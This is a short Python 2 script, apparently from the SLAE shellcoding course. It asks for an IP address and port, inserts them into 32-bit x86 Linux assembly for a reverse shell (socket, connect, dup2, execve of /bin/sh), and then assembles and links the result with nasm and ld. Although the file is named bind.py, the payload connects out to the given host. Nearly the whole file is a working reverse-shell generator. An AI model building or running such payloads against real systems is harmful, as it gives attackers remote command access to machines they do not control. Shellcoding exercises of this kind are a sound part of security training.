#!/usr/bin/python
# Author: Eric Van Zutphen
# Filename: bind.py
# SLAE - 1140

import sys, struct, subprocess, binascii, socket

def write():
        address = raw_input("Please enter a IP: ")
        port = raw_input("Please enter a port 1-65535: ")
        x = int(port)
        port = struct.unpack('<H',struct.pack('>H',x))[0]
        port = hex(port)
        addr = binascii.hexlify(socket.inet_aton(address))
        ip = socket.inet_aton(address)
        ip = ip.encode('hex')
        ip = [ip[0:2], ip[2:4],ip[4:6],ip[6:8]]
        ip = '0x'+ip[3]+ip[2]+ip[1]+ip[0]
        ip = ip.upper()
        print ip
        shellcode = """global _start

_start:

        jmp short call_reverse_shell

reverse_shell:

        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx

        pop edx
; Socket
        push 0x6 
        push 0x1 
        push 0x2 
        mov al, 0x66 
        mov bl, 0x1 
        mov ecx, esp
        int 0x80

        mov esi, eax


; Reverse
        xor eax, eax
        push eax
        mov dword [esp-4], %s ; IP
        sub esp, 4
        push word %s ; Port
        push word 0x2
        mov ecx, esp
        push 0x10
        push ecx
        push esi
        mov al, 0x66
        mov bl, 0x3
        mov ecx, esp
        int 0x80

; dup 2 loop X 3

        xor ecx, ecx
        mov cl, 0x3

duploop:
        dec cl
        mov al, 0x3f
        mov ebx, esi
        int 0x80
        mov esi, eax
        jnz duploop


; execve

        mov eax, ecx
        xor ecx, eax
        push ecx
        mov dword [esp-4], 0x68732f6e
        mov dword [esp-8], 0x69622f2f
        sub esp, 8
        mov ebx, esp
        push ecx
        push ebx
        mov al, 0xb
        mov ecx, esp
        xor edx, edx
        int 0x80


call_reverse_shell:
        call reverse_shell""" %(ip,port)

        shellcode_file = open("shell.nasm", "w")
        shellcode_file.write(shellcode)
write()



def compile():
        compiler = subprocess.Popen(('nasm -f elf32 -o shell.o shell.nasm'),shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
        (compiler_stdout_result, compiler_stderr_result) = compiler.communicate()
        linker = subprocess.Popen(('ld -o shell shell.o'),shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
        (linker_stdout_result, linker_stderr_result) = linker.communicate()
compile()